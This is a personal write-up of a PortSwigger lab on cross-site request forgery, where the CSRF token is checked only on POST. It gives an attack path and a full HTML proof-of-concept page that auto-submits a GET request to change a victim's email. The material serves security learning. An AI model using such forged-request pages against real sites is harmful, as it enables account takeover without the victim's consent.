# [CSRF where token validation depends on request method] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-08
 
---
 
## Vulnerability / core concept
Cross-site Request Forgery

## What made me stuck
At first it was confusing why payload is not working, then I figured it out pretty quickly using AI. So this level was pretty straightforward and easy.
 
## What unblocked me
`null`
 
---


## Attack path
1) First we need to log in to get email change functionality.
2) After that, we can start inspecting the application. As we can see during inspection using proxy tools, app uses csrf token to prevent csrf.
3) Using POST request does not work because app checks csrf token properly, however, GET request works. Application does not check the csrf token in GET like it does in POST.
4) We craft simple payload and deliver it to the victim to exploit csrf and solve this lab.

---


## Payload / key command
```html
<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>Standard CSRF PoC</h3>
      <form action="https://0ae6006d04f82ddb803a1269005d00bd.web-security-academy.net/my-account/change-email" method="get">
  
          <input type="hidden" name="email" value="babek@victim">
      </form>
      <script>
          history.pushState('', '', '/');
          document.forms[0].submit();
      </script>
  </body>
  </html>
```
We need to deliver this to victim to complete csrf attack.

Note: Here we should use `<input type="hidden" name="email" value="babek@victim">` because without `name` and `value` victim will receive just path, no query will be sent, so no csrf attack will happen.


---


## What I'd recognize faster next time
This lab showed me that instead having parameters for GET request in body, it is required to use them in path as a query. For payload, it is important to use `name` and `value` attributes so we can send proper payload to the victim.
 

